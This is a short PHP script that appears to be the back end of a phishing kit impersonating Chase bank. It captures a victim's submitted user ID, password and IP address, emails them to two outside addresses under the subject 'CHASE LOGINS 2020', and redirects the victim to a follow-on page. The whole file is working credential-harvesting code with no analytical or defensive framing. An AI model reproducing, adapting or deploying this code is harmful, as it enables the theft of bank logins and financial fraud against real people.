<?

$ip = getenv("REMOTE_ADDR");
$message .= "---- : || GhostMode || :------\n";
$message .= "User ID             : ".$_POST['userId']."\n";
$message .= "Password              : ".$_POST['password']."\n";
$message .= "----: || GhostMode || :------\n";
$message .= "IP: ".$ip."\n";


$recipient = "hocraig@yandex.com, jimmyDavis121@outlook.com";
$subject = " CHASE LOGINS 2020  | ".$ip."\n";

mail($recipient,$subject,$message);
header("Location:  Chase_Email.html");
?>


